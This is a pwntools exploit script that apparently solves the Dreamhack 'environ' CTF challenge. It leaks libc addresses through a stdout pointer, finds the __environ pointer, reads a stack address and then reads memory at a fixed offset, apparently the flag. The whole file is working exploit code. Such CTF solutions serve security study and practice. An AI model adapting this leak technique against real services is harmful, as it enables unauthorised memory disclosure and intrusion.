from pwn import *
import warnings

warnings.filterwarnings('ignore')

p = remote('host3.dreamhack.games', 20668)
#p = process("./environ")
elf = ELF('./libc.so.6')
p.recvuntil(b": ")
stdout = int(p.recvuntil("\n"),16)
libc_base = stdout - elf.symbols['_IO_2_1_stdout_']
libc_environ = libc_base + elf.symbols['__environ']
print(hex(libc_base))
print(hex(libc_environ))
p.sendlineafter(b">", b"1")
p.sendlineafter(b":", str(libc_environ).encode())
p.recv(1)
stack_environ = u64(p.recv(6).ljust(8, b"\x00")) 
file_content = stack_environ - 0x1568
p.sendlineafter(b">", b"1")
p.sendlineafter(b":", str(file_content))
p.interactive()